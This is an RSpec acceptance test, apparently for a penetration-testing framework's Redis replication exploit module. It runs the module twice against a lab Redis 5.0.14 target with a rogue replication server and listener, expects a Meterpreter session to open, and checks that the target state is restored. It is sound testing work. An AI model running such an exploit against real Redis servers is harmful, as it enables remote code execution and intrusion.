require 'acceptance_spec_helper'
require_relative '../../../test/module_targets/redis_replication/acceptance'

RSpec.describe 'Genuine Redis replication owner', order: :defined do
  include_context 'module target'
  include_context 'wait_for_expect'
  include Acceptance::RedisReplication

  let(:owner) { Acceptance::RedisReplication::OWNER }
  let(:payload_name) { Acceptance::RedisReplication::PAYLOAD }

  before(:all) { rr_boot }

  it 'checks the independently validated Redis service' do
    output = run_target_module(owner, 'target', {}, action: 'check')
    expect(output).to include('Redis version is 5.0.14')
  end

  it 'uses and closes owning sessions twice with per-run state restored' do
    2.times do |index|
      output = run_target_module(owner, 'target', {
        'CUSTOM' => false, 'PAYLOAD' => payload_name, 'LHOST' => listener_host,
        'LPORT' => 4444, 'SRVHOST' => listener_host, 'SRVPORT' => 6380
      }, action: 'run -z', command_timeout: 180, allow_errors: true)
      errors = output.lines.grep(/\[-\]/)
      expect(errors.length).to be <= 1
      errors.each do |line|
        expect(line).to match(/\A\[-\].* - No response to 'shell\.exec\\x20/)
      end
      @rr[:owner_diagnostics] = errors
      expect(output).to match(/Meterpreter session \d+ opened/)
      rr_use(owner, "owner-#{index}")
      actual = rr_state
      @rr[:post_owner] << actual
      rr_save
      expect(actual).to eq(@rr.fetch(:baseline))
    end
  end

  after(:all) { rr_finish if @rr }
end
